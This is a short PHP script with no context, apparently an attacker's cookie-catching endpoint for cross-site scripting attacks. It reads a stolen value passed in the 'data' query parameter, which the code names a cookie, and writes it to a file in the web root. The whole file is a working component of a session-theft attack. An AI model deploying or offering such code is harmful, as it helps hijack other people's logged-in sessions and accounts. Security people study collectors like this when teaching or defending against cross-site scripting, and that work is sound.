<?php
$cookie=$_GET["data"];
$log=fopen("/var/www/html/data.txt","w");
fwrite($log,$cookie);
fclose($log);
?>
